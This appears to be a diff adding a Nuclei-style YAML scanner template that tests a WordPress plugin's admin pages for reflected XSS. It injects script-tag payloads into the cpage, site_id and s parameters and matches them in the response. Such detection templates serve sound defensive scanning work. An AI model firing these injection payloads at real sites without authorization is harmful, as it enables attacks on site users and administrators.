@@ -1,0 +1,20 @@
+id: xss-detection-example
+info:
+  name: XSS Detection Example
+  author: pdteam
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-admin/admin.php?page=etmbu-all-posts&s=yes&markdone=no&cpage=\"\"><script>alert(%2FXSS%2F)<%2Fscript>"
+      - "{{BaseURL}}/wp-admin/admin.php?page=etmbu-all-emails&invalid=yes&site_id=\"\"><script>alert(/XSS-SiteID/)</script>&s=\"\"><script>alert(/XSS-S/)</script>"
+      - "{{BaseURL}}/wp-admin/admin.php?page=etmbu-all-emails&unsub=yes&site_id=\"\"><script>alert(%2FXSS-SiteID%2F)<%2Fscript>&s=\"\"><script>alert(%2FXSS-S%2F)<%2Fscript>"
+
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(%2FXSS%2F)<%2Fscript>"
+          - "<script>alert(/XSS-SiteID/)</script>"
+          - "<script>alert(/XSS-S/)</script>"
+        part: body
